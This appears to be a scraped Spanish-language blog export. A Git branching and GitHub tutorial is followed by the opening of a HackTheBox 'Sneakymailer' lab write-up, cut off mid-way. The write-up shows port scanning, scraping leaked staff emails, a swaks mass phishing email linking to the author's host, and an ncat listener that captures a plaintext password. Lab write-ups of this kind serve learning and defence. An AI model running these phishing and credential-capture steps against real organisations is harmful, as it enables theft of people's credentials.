al branch principal. El concepto es similar a las ramas de un arbol, donde tenemos como branch o rama principal main o master y desde ahi podemos crear otras subramas que en algun momento si queremos podemos convinar.  Supongamos que tenemos una linea actual del proyecto, pero queremos agregarle nuevas funcionalidades como una nueva sección o cambiar algo para ver su funcionamiento. Pues si creamos un nuevo branch podemos realizar nuestros cambios sin afectar la versión que actualmente este activo. Una vez que el branch alterno a evolucionado con todos los cambios correspondientes, podemos combinarla con el branch principal. Creación de un Branch #: Para poder crear un nuevo branch debemos ejecutar el comando git branch y seguidamente el nombre de la rama que queremos crear ❯ git branch primer-branch-alternoy ahora para visualizar los branch que tenemos usamos unicamente el comando git branch ❯ git branch* main primer-branch-alternoEl comandos nos muestra que ahora tenemos dos branch, el principal que teniamos main y ahora el nuevo que creamos primer-branch-alterno Moverse de Branch #: Si queremos desplazarnos de un branch a otro debemos ejecutar el comando git checkout y seguido el nombre del branch ❯ git checkout primer-branch-alternoCambiado a rama 'primer-branch-alterno'Para confirmar que nos cambiamos a ese nuevo branch volvemos a ejecutar git branch y esta vez nos selecciona el branch alterno ❯ git branch main* primer-branch-alternoAhora existe una forma de agilizar este proceso de creación y desplazamiento de un branch para ello debemos ejecutar git checkout -b y seguido el nombre de la rama. Pero es importante antes de ejecutar el comando volver a nuestro branch original main ya que nos encontramos en el branch primer-branch-alterno y nosotros queremos crear el branch a partir de el branch principal. ❯ git checkout mainCambiado a rama 'main'y ahora si podemos ejecutar el comando y visializamos que efectivamente nos encontramos en el nuevo branch ❯ git checkout -b segundo-branch-alternoCambiado a nueva rama 'segundo-branch-alterno'❯ git branch main primer-branch-alterno* segundo-branch-alternoCambiar Nombre al Branch #: Para cambiar el nombre de un branch existen dos metodos: En el primero debemos estar en el branch que deseamos cambiar el nombre, para este caso queremos cambiar el nombre de primer-branch-alterno a primer-branch y ejecutar el comando git branch -m y seguidamente el nuevo nombre a asignar. ❯ git checkout primer-branch-alternoCambiado a rama 'primer-branch-alterno'git branch -m primer-branchVerificamos los cambios usando git branchy efectivamente nos modifico el nombre ❯ git branch main* primer-branch segundo-branch-alternoSi queremos usar el segundo metodo no es necesario estar en el branch que deseamos cambiar, tan solo hay que ejecutar git branch -m, seguidamente el nombre del branch que deseamos cambiar segundo-branch-alterno y despues el nuevo nombre que se le asignara segundo-branch ❯ git branch -m segundo-branch-alterno segundo-branch❯ git branch main* primer-branch segundo-branchEliminar un Branch #: Una vez que combinamos los cambios que realizamos en los branchs o si las creamos por error, podemos eliminarlos. Si deseamos eliminar el branch, hay que ejecutar el comando git branch -d y seguidamente el nombre del branch que queramos borrar. ❯ git branch -d segundo-branchEliminada la rama segundo-branch (era 415796f). ❯ git branchVerificamos si se realizaron los cambios y se borro el branch con exito. ❯ git branch main* primer-branch Este comando aplica a branch en repositorios locales no en branch que se encuentren publicadas. Crear Commits en un Branch #: Veamos como podemos crear un commit en un branch que no sea main que nosotros creemos y veremos como podemos cambiar entre estos branch para ver como nuestros archivos cambian en nuestros directorios de trabajo. Esta parte es excelente, paece magia negra xD! Bueno sabemos que tenemos un archivo de texto en nuestro directorio llamado archivo_git. txt con un cotenido asignado. ❯ ls archivo_git. txt❯ /bin/cat archivo_git. txtEste es mi segundo commit pero modificadoAhora nos encontramos en nuestro branch principal main ❯ git branch* main primer-branchPrimero para realizar un cambio nos vamos a mover a nuestro branch alterno primer-branch ❯ git checkout primer-branchCambiado a rama 'primer-branchUna vez nos en este branch leemos el archivo que tenemos. ❯ /bin/cat archivo_git. txtEste es mi segundo commit pero modificadoPodemos ver que el contenido es el mismo, entonces ahora vamos a modificarlo. ❯ /bin/cat archivo_git. txtHola GitVeamos ahora que ocurre si ejecutamos git status ❯ git statusEn la rama primer-branchCambios no rastreados para el commit: (usa  git add &lt;archivo&gt;. . .   para actualizar lo que será confirmado) (usa  git restore &lt;archivo&gt;. . .   para descartar los cambios en el directorio de trabajo)	modificados:   archivo_git. txtsin cambios agregados al commit (usa  git add  y/o  git commit -a )Nos muestra que estamos en el branch alterno primer-branch y que tenemos cambios que aún no han sido preparados para el proximo commit. Entonces para agregsarlo ejecutamos el comando git add . para agregarlos. ❯ git add . ❯ git statusEn la rama primer-branchCambios a ser confirmados: (usa  git restore --staged &lt;archivo&gt;. . .   para sacar del área de stage)	modificados:   archivo_git. txtEsta vez aun estamos en el branch alterno primer-branch, pero si tenemos el archivo en el area de preparación. Procedemos a crear nuestro commit con git commit y se nos abre nuestro editor de texto, en el cual introduciremos la descripción de este nuevo commit Cambiar texto a Hola Git# Por favor ingresa el mensaje del commit para tus cambios. Las# líneas que comiencen con '#' serán ignoradas, y un mensaje# vacío aborta el commit. ## En la rama primer-branch# Cambios a ser confirmados:#	modificados:   archivo_git. txt#Guardamos y cerramos el editor y tendriamos un nuevo commit ❯ git commit[primer-branch 9771c56] Cambiar texto a Hola Git 1 file changed, 1 insertion(+), 1 deletion(-)Vamos a leer el archivo otra vez, recordar que estamos en el branch alterno primer-branch ❯ /bin/cat archivo_git. txtHola Gitefectivamente vemos los cambios que realizamos, pero que pasa si ahora vamos a nuestro branch principal main ❯ git checkout mainCambiado a rama 'main'Una vez aqui voy a leer mi archivo archivo_git. txt ❯ /bin/cat archivo_git. txtEste es mi segundo commit pero modificadoy pumm! wala!! se tenso la cosa, tenemos el contenido antes de realizar el commit en el branch alterno. Esto es super genial por que estamos trabajando con el mismo archivo, pero con dos versiones diferentes :). Historial de Commits en Branchs #: Primeramente vamos a ejecutar el comando git log con el parametro --oneline para acortar la información. ❯ git log --oneline415796f (HEAD -&gt; main) Actualizar teto del segundo commit modificado0143452 agregar mi archivo de textoPodemos ver el historial de commits en main, pero no vemos el commit que realizamos en el branch alterno primer-branch Vamos a irnos a el branch alterno con git checkout ❯ git log --oneline9771c56 (HEAD -&gt; primer-branch) Cambiar texto a Hola Git415796f (main) Actualizar teto del segundo commit modificado0143452 agregar mi archivo de textoNos damos cuenta que ambos branch comparten los ultimos dos commits, pero despues al crearse el branch alterno el primer commit que se creo fue el primero. Por eso este branch muestra este nuevo commit y el branch principal main no, ya que el primer commit pertener a este nuevo branch  Debo mencionar que existe un comando el cual muestra los commit y cual fue la diferencia que introdujo el commit ❯ git log -pcommit 9771c563effc6eb6a82ed94947c125fdbdd03233 (HEAD -&gt; primer-branch)Author: Firtsmiracle &lt;firtsmiracle@hotmail. com&gt;Date:  Mon Apr 10 21:46:43 2023 +0000  Cambiar texto a Hola Gitdiff --git a/archivo_git. txt b/archivo_git. txtindex cf36484. . 0152d71 100644--- a/archivo_git. txt+++ b/archivo_git. txt@@ -1 +1 @@-Este es mi segundo commit pero modificado+Hola GitMerge - Fusionar Branchs #: Ya que los branchs son temporales, debido a que existen miestras estamos desarrollando alguna funcionalidad o corrigiendo un problema, llegara un momento en que debamos fusionar esos cambios con el branch principal, este proceso se denomina merge  Para fusionar dos branch es muy importante estar en el branch que recibira la fusión. Para ello vamos a practicar lo anteriormente aprendido. Primero voy a dirigirme a el branch principal main ❯ git checkout mainCambiado a rama 'main'❯ git branch* main primer-branchAhora crearemos un nuevo branch y nos metemos en el ❯ git checkout -b segundo-branchCambiado a nueva rama 'segundo-branch'❯ git branch main primer-branch* segundo-branchVamos a modificar el archivo archivo_git. txt ❯ /bin/cat archivo_git. txtHola GitAhora estoy aprendiendo GitContinuamos verificado el estadoy vemos que fue modificado ❯ git statusEn la rama segundo-branchCambios no rastreados para el commit: (usa  git add &lt;archivo&gt;. . .   para actualizar lo que será confirmado) (usa  git restore &lt;archivo&gt;. . .   para descartar los cambios en el directorio de trabajo)	modificados:   archivo_git. txtsin cambios agregados al commit (usa  git add  y/o  git commit -a )Sigue agregarlo al area de preparación ❯ git add . ❯ git statusEn la rama segundo-branchCambios a ser confirmados: (usa  git restore --staged &lt;archivo&gt;. . .   para sacar del área de stage)	modificados:   archivo_git. txtCreamos el commit con git commit Agregamos una segunda linea al archivo# Por favor ingresa el mensaje del commit para tus cambios. Las# líneas que comiencen con '#' serán ignoradas, y un mensaje# vacío aborta el commit. ## En la rama segundo-branch# Cambios a ser confirmados:#	modificados:   archivo_git. txt#Guardamos y cerramos ❯ git commit[segundo-branch 924f1c5] Agregamos una segunda linea al archivo 1 file changed, 2 insertions(+), 1 deletion(-)Ahora volveremos a el branch principal main y vemos el antiguo contenido. ❯ /bin/cat archivo_git. txtEste es mi segundo commit pero modificadoPara poder realizar ahora el merge o la fusión de branch, despues de ya terminar de hacer todos nuestros cambios. Debemos estar en el branch que recibira los cambios. ❯ git branch* main primer-branch segundo-branchY ahora procedemos a ejecutar el comando git merge seguido de el nombre de la rama que queremos fusionar, en nuesto caso queremos fusionar el branch recien creado segundo-branch ❯ git merge segundo-branchActualizando 415796f. . 924f1c5Fast-forward archivo_git. txt | 3 ++- 1 file changed, 2 insertions(+), 1 deletion(-)Vemos el mensaje de que se estan combinando todos los commits con el branch principal Y ahora si leemos el archivo archivo_git. txt, vemos que se combinaron ambos branch :) ❯ /bin/cat archivo_git. txtHola GitAhora estoy aprendiendo Gity si vemos el historial ahora ese commit que hicimos al modificar el archivo en segundo-branch, tambien es parte de main ❯ git log --oneline924f1c5 (HEAD -&gt; main, segundo-branch) Agregamos una segunda linea al archivo415796f Actualizar teto del segundo commit modificado0143452 agregar mi archivo de textoConflictos en Merge - Conflictos al fusionar Branchs #: Ya que realizamos antes el merge de ambos branch, no necesitamos ya el branch que creamos segundo-branch ❯ git branch* main primer-branch segundo-branchAsi que podemos borrar este branch ❯ git branch -d segundo-branchEliminada la rama segundo-branch (era 924f1c5). Ahora los conflictos ocurren cuando tratamos de hacer un merge de archivos que tienen cambios que tienen conflictos. Estos pueden ser: Modificar el mismo texto, Modificar la misma linea o elemento, esto Git los considera incompatible. En estos casos tenemos que decidir como vamos a hacer el merge Veamoslo a continuación: Vemos que el contenido del archivo en primer-branch es ❯ git branch main* primer-branch❯ /bin/cat archivo_git. txtHola miGity ahora si vamos a main y leemos el archivo ❯ git checkout mainCambiado a rama 'main'❯ /bin/cat archivo_git. txtHola GitAhora estoy aprendiendo GitQue pasa si intentamos hacer un merge de ambos branch ❯ git merge primer-branchAuto-fusionando archivo_git. txtCONFLICTO (contenido): Conflicto de fusión en archivo_git. txtFusión automática falló; arregle los conflictos y luego realice un commit con el resultado. Al ejecutar el comando, nos dice que la combinación automatica falló y debemos arreglar los conflictos. Si vamos a nuestro editor de texto nos mostrara algo de este tipo &lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADHola GitAhora estoy aprendiendo Git=======Hola miGit&gt;&gt;&gt;&gt;&gt;&gt;&gt; primer-branchEn este caso el editor de texto Visual Studio Code, nos fascilita decidir cuando tenemos este tipo de conflictos. Asi que en estos casos es muy recomendable usarlo. Nos da las opciones:  Accept Current Change : Aceptar el cambio actual “del branch main” Accept Incoming Change : Aceptar el cambio entrante “del branch primer-branch” Accept Both Change : Aceptar ambos cambios Compare changes : Comparar los cambios Esa decisión ya dependera del cambio que estes dispuesto a aceptar. En este caso usare la opción de aceptar ambos cambios.  Continuamos guardando y cerrando el editor y ejecutamos git merge --continue para continuar el proceso de fusión, esto nos abrira el editor nuevamente con el mensaje que se asignara al commit Merge branch 'primer-branch'# Conflicts:#	archivo_git. txt## Parece que estás realizando una fusión. # Si esto no es correcto, ejecuta#	git update-ref -d MERGE_HEAD# e intenta de nuevo. # Por favor ingresa el mensaje del commit para tus cambios. Las# líneas que comiencen con '#' serán ignoradas, y un mensaje# vacío aborta el commit. ## En la rama main# Todos los conflictos resueltos pero sigues fusionando. ## Cambios a ser confirmados:#	modificados:   archivo_git. txt#Guardamos el archivo y cerramos para culminar el proceso ❯ git merge --continue[main 95b5d86] Merge branch 'primer-branch'Pudimos solucionar el conflicto y nos hizo el merge de manera exitosa, como vimos en este caso visual studio code es muy útil para solucionar estos conflictos. Ahora finalmente leeremos el archivo otra vez ❯ /bin/cat archivo_git. txtHola GitAhora estoy aprendiendo GitHola miGitY como resultado tenemos el archivo tal y cual lo combinamos. Conexión con Github #: Despues de haber trabajado todo nuestro codigo, llego la hora de subirlo a la nube. Vamos a hacer esto utilizando GitHub Para ello lo primero que debemos hacer es crearnos una cuenta, lo cual es un proceso muy sencillo, podemos hacerlo usando dirigiendonos a este enlace:  https://github. com/signup?return_to=https%3A%2F%2Fgithub. com%2Ftopics%2Flogin&amp;source=loginUna vez creada nuestra cuenta nos vamos a la sección de Repositorios y le damos a New Ahora vamos a elegir un nombre para nuestro repositorio en este caso usaremos de nombre mi-primer-repositorio Lo siguiente sera dar click en Create Ahora nos dara una serie de opciones de que podemos hacer para subirlo aqui en github Nosotros usaremos el comando, git remote add origin https://github. com/f1rtsmiracle/mi-primer-repositorio. git, en donde git remote nos va a servir para indicar si es que vamos a tener un servidor remoto en el cual subir nuestros cambios y con add origin le indicamos de donde nosotros tenemos que ir a obtener nuestro codigo y tambien a donde tenemos que subir los cambios realizados y finalmente la url de donde se encuentra almacenado nuestro codigo. ❯ git remote add origin https://github. com/f1rtsmiracle/mi-primer-repositorio. gitFinalmente usaremos el comando git push, para subir nuestros cambios los cuales seran con respecto a el branch con la que estemos trabajando, pero ya que main no se encuentra creado en github con -u creamos el branch y con origin indicamos donde queremos que sea creado y finalmente el nombre del branch ❯ git push -u origin mainDespues de ejecutar el comando nos pedira ingresar el nombre de usuario y el password Procedemos a ingresar el usuario: ❯ git push -u origin mainUsername for 'https://github. com': f1rtsmiraclePassword for 'https://f1rtsmiracle@github. com':Sim embargo en password no debemos ingresar la contraseña con la que nos registramos a github. Aqui nosotros debemos introducir una key Para obtenerla nos dirigimos a la opción de nuestro perfil settings Despues nos vamos a la opción Developer Settings A continuación vamos a la opción Personal Access Token -&gt; Tokens (classic) -&gt; Generate New Token Ingresamos el nombre del token, establecemos un tiempo de expiración y marcamos la opción repo Finalmente damos click en la opción Generate Token Estos nos mostrara nuestro token creado el cual debemos copiarlo y ingresarlo en Password y vemos como todo nuestro codigo se subio a github ❯ git push -u origin mainUsername for 'https://github. com': f1rtsmiraclePassword for 'https://f1rtsmiracle@github. com': Enumerando objetos: 21, listo. Contando objetos: 100% (21/21), listo. Compresión delta usando hasta 4 hilosComprimiendo objetos: 100% (8/8), listo. Escribiendo objetos: 100% (21/21), 1. 73 KiB | 888. 00 KiB/s, listo. Total 21 (delta 1), reusados 0 (delta 0), pack-reusados 0remote: Resolving deltas: 100% (1/1), done. To https://github. com/f1rtsmiracle/mi-primer-repositorio. git * [new branch]   main -&gt; mainRama 'main' configurada para hacer seguimiento a la rama remota 'main' de 'origin'. Vamos a nuestro repositorio nuevamente y vemos los cambios.  Y cada vez que queramos seguir agregando nuevos cambios, lo vamos modificando con nuestro editor de texto preferido, luego nos vamos a la terminal y los agregamos con git add. Creamos un commit y finalmente usamos el comando de git push y con ese vamos a agregar todos nuestros cambios. Ahora en caso que estemos creando un nuevo branch y todavia no queremos hacerle un merge, pero si queremos subirlo a github, lo que tenemos que hacer es cambiar de branch con el comando git checkout nombre_branch y ejecutamos git push -u nombre_rama y lo que hara es crear este branch en el repositorio. Espero haberte ayudado, esto seria todo hasta la proxima!!! :) "
    }, {
    "id": 39,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Sneakymailer",
    "title": "Maquina Sneakymailer - htb writeup",
    "body": "2023/04/08 - Hoy vamos a resolver una máquina hackthebox de dificultad media, la cual explotaremos a partir de información lekeada y realizando un ataque masivo de email, después migraremos a otro usuario abusando de un pypi server creando un paquete malicioso y finalmente escalaremos privilegios como el usuario root abusando de un privilegio de sudoers en pip3. Vamos a comenzar creando un directorio con el nombre de la maquina: ❯ mkdir Sneakymailer❯ ls SneakymailerSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap, content, scripts}}❯ mkt❯ ls content  nmap  scriptsEnumeración #: Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 197PING 10. 10. 10. 197 (10. 10. 10. 197) 56(84) bytes of data. 64 bytes from 10. 10. 10. 197: icmp_seq=1 ttl=63 time=2582 ms--- 10. 10. 10. 197 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 2582. 173/2582. 173/2582. 173/0. 000 msVemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre allPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 197 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-04-08 21:19 GMTInitiating SYN Stealth Scan at 21:19Scanning 10. 10. 10. 197 [65535 ports]Discovered open port 80/tcp on 10. 10. 10. 197Discovered open port 22/tcp on 10. 10. 10. 197Discovered open port 21/tcp on 10. 10. 10. 197Discovered open port 25/tcp on 10. 10. 10. 197Discovered open port 8080/tcp on 10. 10. 10. 197Discovered open port 143/tcp on 10. 10. 10. 197Discovered open port 993/tcp on 10. 10. 10. 197Completed SYN Stealth Scan at 21:20, 20. 33s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 197Host is up, received user-set (0. 31s latency). Scanned at 2023-04-08 21:19:57 GMT for 20sNot shown: 63699 closed tcp ports (reset), 1829 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE  REASON21/tcp  open ftp    syn-ack ttl 6322/tcp  open ssh    syn-ack ttl 6325/tcp  open smtp    syn-ack ttl 6380/tcp  open http    syn-ack ttl 63143/tcp open imap    syn-ack ttl 63993/tcp open imaps   syn-ack ttl 638080/tcp open http-proxy syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 20. 46 seconds      Raw packets sent: 98589 (4. 338MB) | Rcvd: 88844 (3. 554MB)Escaneo de Version y Servicios. : ❯ nmap -sCV -p21,22,25,80,143,993,8080 10. 10. 10. 197 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-04-08 21:21 GMTNmap scan report for 10. 10. 10. 197Host is up (0. 40s latency). PORT   STATE SERVICE VERSION21/tcp  open ftp   vsftpd 3. 0. 322/tcp  open ssh   OpenSSH 7. 9p1 Debian 10+deb10u2 (protocol 2. 0)| ssh-hostkey: |  2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)|  256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)|_ 256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)25/tcp  open smtp   Postfix smtpd|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING80/tcp  open http   nginx 1. 14. 2|_http-title: Did not follow redirect to http://sneakycorp. htb|_http-server-header: nginx/1. 14. 2143/tcp open imap   Courier Imapd (released 2018)|_imap-capabilities: THREAD=REFERENCES OK IDLE CHILDREN ACL2=UNION STARTTLS UIDPLUS SORT NAMESPACE ACL completed CAPABILITY QUOTA IMAP4rev1 UTF8=ACCEPTA0001 ENABLE THREAD=ORDEREDSUBJECT|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example. com| Not valid before: 2020-05-14T17:14:21|_Not valid after: 2021-05-14T17:14:21993/tcp open ssl/imap Courier Imapd (released 2018)|_imap-capabilities: THREAD=REFERENCES OK IDLE CHILDREN ACL2=UNION UIDPLUS SORT NAMESPACE ACL AUTH=PLAIN completed CAPABILITY QUOTA IMAP4rev1 UTF8=ACCEPTA0001 ENABLE THREAD=ORDEREDSUBJECT| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US| Subject Alternative Name: email:postmaster@example. com| Not valid before: 2020-05-14T17:14:21|_Not valid after: 2021-05-14T17:14:21|_ssl-date: TLS randomness does not represent time8080/tcp open http   nginx 1. 14. 2|_http-open-proxy: Proxy might be redirecting requests|_http-title: Welcome to nginx!|_http-server-header: nginx/1. 14. 2Service Info: Host: debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 78. 06 secondsVisulizamos información interesante de los puertos escaneados:       Puerto   Servicio   Versión         21   FTP   vsftpd 3. 0. 3       22   SSH   OpenSSH 7. 9p1       25   SMTP   Postfix smtpd       80   HTTP   nginx 1. 14. 2       143   IMAP   Courier Imapd       993   IMAP/SSL   Courier Imapd       8080   HTTP   nginx 1. 14. 2   Comenzando primeramente intentaremos conectarnos como el usuario anonymous por el servicio ftp ❯ ftp 10. 10. 10. 197Connected to 10. 10. 10. 197. 220 (vsFTPd 3. 0. 3)Name (10. 10. 10. 197:fmiracle): anonymous530 Permission denied. Login failed. ftp&gt;Vemos que no contamos con acceso asi que proseguiremos a usar la herramienta whatweb para ver el gestor de contenido de los servicios http ❯ whatweb http://10. 10. 10. 197http://10. 10. 10. 197 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1. 14. 2], IP[10. 10. 10. 197], RedirectLocation[http://sneakycorp. htb], Title[301 Moved Permanently], nginx[1. 14. 2]http://sneakycorp. htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1. 14. 2], IP[10. 10. 10. 197], JQuery, Script, Title[Employee - Dashboard], X-UA-Compatible[IE=edge], nginx[1. 14. 2]❯ whatweb http://10. 10. 10. 197:8080http://10. 10. 10. 197:8080 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1. 14. 2], IP[10. 10. 10. 197], Title[Welcome to nginx!], nginx[1. 14. 2]whatweb nos reporta que se esta aplicando virtual hosting, concretamente al dominio http://sneakycorp. htb asi que comenzemos agregandolo a nuestro /etc/hosts echo  10. 10. 10. 197 sneakycorp. htb  &gt;&gt; /etc/hostsExplotación #: Vamos a proceder a abrir la pagina web.  Podemos observar un proyecto que nos habla de pypi, pero que es pypi  El Python Package Index o PyPI es el repositorio de software oficial para aplicaciones de terceros en el lenguaje de programación Python.  Observamos un potencial de correos filtrados de la compañia Parceamos los correos filtrados usando la siguente expresión y los exportamos a un fichero de nombre mails. txt curl -s -X GET  http://sneakycorp. htb/team. php  | grep  sneakymailer  | html2text | xargs | tr ' ' ',' &gt; mails. txt❯ /bin/cat mails. txttigernixon@sneakymailer. htb,garrettwinters@sneakymailer. htb,ashtoncox@sneakymailer. htb,cedrickelly@sneakymailer. htb,airisatou@sneakymailer. htb,briellewilliamson@sneakymailer. htb,herrodchandler@sneakymailer. htb,rhonadavidson@sneakymailer. htb,colleenhurst@sneakymailer. htb,sonyafrost@sneakymailer. htb,jenagaines@sneakymailer. htb,quinnflynn@sneakymailer. htb,chardemarshall@sneakymailer. htb,haleykennedy@sneakymailer. htb,tatyanafitzpatrick@sneakymailer. htb,michaelsilva@sneakymailer. htb,paulbyrd@sneakymailer. htb,glorialittle@sneakymailer. htb,bradleygreer@sneakymailer. htb,dairios@sneakymailer. htb,jenettecaldwell@sneakymailer. htb,yuriberry@sneakymailer. htb,caesarvance@sneakymailer. htb,doriswilder@sneakymailer. htb,angelicaramos@sneakymailer. htb,gavinjoyce@sneakymailer. htb,jenniferchang@sneakymailer. htb,brendenwagner@sneakymailer. htb,fionagreen@sneakymailer. htb,shouitou@sneakymailer. htb,michellehouse@sneakymailer. htb,sukiburks@sneakymailer. htb,prescottbartlett@sneakymailer. htb,gavincortez@sneakymailer. htb,martenamccray@sneakymailer. htb,unitybutler@sneakymailer. htb,howardhatfield@sneakymailer. htb,hopefuentes@sneakymailer. htb,vivianharrell@sneakymailer. htb,timothymooney@sneakymailer. htb,jacksonbradshaw@sneakymailer. htb,olivialiang@sneakymailer. htb,brunonash@sneakymailer. htb,sakurayamamoto@sneakymailer. htb,thorwalton@sneakymailer. htb,finncamacho@sneakymailer. htb,sergebaldwin@sneakymailer. htb,zenaidafrank@sneakymailer. htb,zoritaserrano@sneakymailer. htb,jenniferacosta@sneakymailer. htb,carastevens@sneakymailer. htb,hermionebutler@sneakymailer. htb,laelgreer@sneakymailer. htb,jonasalexander@sneakymailer. htb,shaddecker@sneakymailer. htb,sulcud@sneakymailer. htb,donnasnider@sneakymailer. htbComo antes nos reporto nmap el servicio imap se encuentra activo y como ahora disponemos de una lista de correos, podemos tratar de enviar un correo como cualquier usuario y ver si se nos permite de estar mal configurado. Para eso usaremos la herramienta swaks  para instalar la herramienta solo basta con hacer un apt install swaks Especificaremos con los comandos from el correo origen, --to la lista de correos que obtuvimos, en el body podemos tratar de enviar un enlace a un servidor http que nos compartiremos de manera local, de modo que si alguno de los usuarios destinatarios esta abriendo el correo y pinche en el enlace, causara que nos envie una solicitud. ❯ swaks --from fmiracle@sneakymailer. htb --to tigernixon@sneakymailer. htb,garrettwinters@sneakymailer. htb,ashtoncox@sneakymailer. htb,cedrickelly@sneakymailer. htb,airisatou@sneakymailer. htb,briellewilliamson@sneakymailer. htb,herrodchandler@sneakymailer. htb,rhonadavidson@sneakymailer. htb,colleenhurst@sneakymailer. htb,sonyafrost@sneakymailer. htb,jenagaines@sneakymailer. htb,quinnflynn@sneakymailer. htb,chardemarshall@sneakymailer. htb,haleykennedy@sneakymailer. htb,tatyanafitzpatrick@sneakymailer. htb,michaelsilva@sneakymailer. htb,paulbyrd@sneakymailer. htb,glorialittle@sneakymailer. htb,bradleygreer@sneakymailer. htb,dairios@sneakymailer. htb,jenettecaldwell@sneakymailer. htb,yuriberry@sneakymailer. htb,caesarvance@sneakymailer. htb,doriswilder@sneakymailer. htb,angelicaramos@sneakymailer. htb,gavinjoyce@sneakymailer. htb,jenniferchang@sneakymailer. htb,brendenwagner@sneakymailer. htb,fionagreen@sneakymailer. htb,shouitou@sneakymailer. htb,michellehouse@sneakymailer. htb,sukiburks@sneakymailer. htb,prescottbartlett@sneakymailer. htb,gavincortez@sneakymailer. htb,martenamccray@sneakymailer. htb,unitybutler@sneakymailer. htb,howardhatfield@sneakymailer. htb,hopefuentes@sneakymailer. htb,vivianharrell@sneakymailer. htb,timothymooney@sneakymailer. htb,jacksonbradshaw@sneakymailer. htb,olivialiang@sneakymailer. htb,brunonash@sneakymailer. htb,sakurayamamoto@sneakymailer. htb,thorwalton@sneakymailer. htb,finncamacho@sneakymailer. htb,sergebaldwin@sneakymailer. htb,zenaidafrank@sneakymailer. htb,zoritaserrano@sneakymailer. htb,jenniferacosta@sneakymailer. htb,carastevens@sneakymailer. htb,hermionebutler@sneakymailer. htb,laelgreer@sneakymailer. htb,jonasalexander@sneakymailer. htb,shaddecker@sneakymailer. htb,sulcud@sneakymailer. htb,donnasnider@sneakymailer. htb --body  Entra aqui -&gt; http://10. 10. 16. 2/test  --server 10. 10. 10. 197=== Trying 10. 10. 10. 197:25. . . === Connected to 10. 10. 10. 197. &lt;- 220 debian ESMTP Postfix (Debian/GNU) -&gt; EHLO hack4u&lt;- 250-debian&lt;- 250-PIPELINING&lt;- 250-SIZE 10240000&lt;- 250-VRFY&lt;- 250-ETRN&lt;- 250-STARTTLS&lt;- 250-ENHANCEDSTATUSCODES&lt;- 250-8BITMIME&lt;- 250-DSN&lt;- 250-SMTPUTF8&lt;- 250 CHUNKING -&gt; MAIL FROM:&lt;fmiracle@sneakymailer. htb&gt;&lt;- 250 2. 1. 0 Ok -&gt; RCPT TO:&lt;tigernixon@sneakymailer. htb&gt;Nos ponemos en escucha con ncat en el puerto 80 y recibimos una petición post. ❯ ncat -nlvp 80Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::80Ncat: Listening on 0. 0. 0. 0:80Ncat: Connection from 10. 10. 10. 197. Ncat: Connection from 10. 10. 10. 197:39458. POST /test HTTP/1. 1Host: 10. 10. 16. 2User-Agent: python-requests/2. 23. 0Accept-Encoding: gzip, deflateAccept: */*Connection: keep-aliveContent-Length: 185Content-Type: application/x-www-form-urlencodedfirstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer. htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHtTramos la data y lo exportamos a un ficherito llamando credentials. txt, donde podemos ver las credenciales de el usuario Paul ❯ php --interactiveInteractive mode enabledphp &gt; echo urldecode( firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer. htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt );firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd@sneakymailer. htb&amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht❯ /bin/cat credentials. txtfirstName=PaullastName=Byrdemail=paulbyrd@sneakymailer. 